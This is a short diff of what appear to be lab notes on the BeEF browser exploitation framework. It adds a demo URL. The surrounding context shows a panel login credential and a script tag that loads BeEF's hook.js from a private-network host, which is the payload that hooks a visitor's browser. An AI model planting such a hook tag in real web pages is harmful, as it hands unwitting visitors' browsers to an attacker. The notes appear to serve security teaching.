@@ -51,6 +51,10 @@ http://127.0.0.1:3000/ui/panel
 beef1:HuMoquooHogyatmebhaiptyeimjoit
 <script src="http://192.168.33.11:3000/hook.js"></script>
 
+URL for sounds: 
+http://192.168.33.11/demos...
+
+
 # What do we learn?
 
 - passwords with apg
